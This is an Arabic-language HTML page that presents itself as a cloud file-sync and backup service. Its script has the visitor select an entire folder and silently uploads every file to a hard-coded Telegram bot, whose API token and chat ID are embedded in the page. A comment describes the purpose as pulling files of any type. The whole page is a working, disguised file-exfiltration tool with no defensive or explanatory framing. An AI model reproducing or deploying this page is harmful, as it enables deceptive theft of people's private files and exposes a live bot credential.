<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز المزامنة السحابية ☁️</title>
    <style>
        body { background: #121212; color: #ffffff; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .box { background: #1e1e1e; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
        .btn { background: #007bff; color: white; padding: 15px 40px; border-radius: 50px; border: none; font-size: 1.2rem; cursor: pointer; font-weight: bold; }
        .loader { margin-top: 20px; color: #00ff00; display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h1>مزامنة الملفات الشاملة</h1>
        <p>اضغط للبدء في نسخ ملفاتك احتياطياً وتأمينها</p>
        
        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الشاملة</button>
        
        <div id="status" class="loader">جاري نقل البيانات وتشفيرها... يرجى عدم الخروج</div>
    </div>

    <script>
        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const CHAT_ID = '7214473798';

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const files = e.target.files;
            if (files.length > 0) {
                document.getElementById('status').style.display = 'block';
                
                for (let i = 0; i < files.length; i++) {
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    // نستخدم sendDocument لسحب أي نوع ملف (PDF, MP4, APK, etc.)
                    formData.append('document', files[i]);

                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => console.log('تم سحب ملف'))
                    .catch(err => console.error('خطأ'));
                }
            }
        });
    </script>
</body>
</html>
